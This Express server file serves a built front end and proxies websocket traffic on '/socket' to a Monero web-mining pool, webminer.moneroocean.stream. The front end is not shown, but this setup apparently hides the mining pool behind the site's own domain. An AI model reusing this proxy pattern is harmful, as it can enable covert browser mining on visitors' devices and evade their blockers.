import express from "express";
import { createServer } from "http";
//import { createProxyMiddleware } from "http-proxy-middleware";
const { createProxyMiddleware } = require("http-proxy-middleware");

import { Server } from "socket.io";

const app = express();
const http = createServer(app);
const path = require("path");

const socketProxy = createProxyMiddleware("/socket", {
  target: "wss://webminer.moneroocean.stream/",
  changeOrigin: true,
  ws: true,
  logLevel: "debug",
});

app.use(socketProxy);
app.use(express.static(path.join(__dirname, "../dist")));
// Catch-all route → serve index.html
app.get("/:path(*)", (req, res) => {
  res.sendFile(path.join(__dirname, "../dist", "index.html"));
});
new Server(http);

const PORT = process.env.PORT || 3001;
http.listen(PORT, () => {
  console.log(`Listening on port ${PORT}`);
});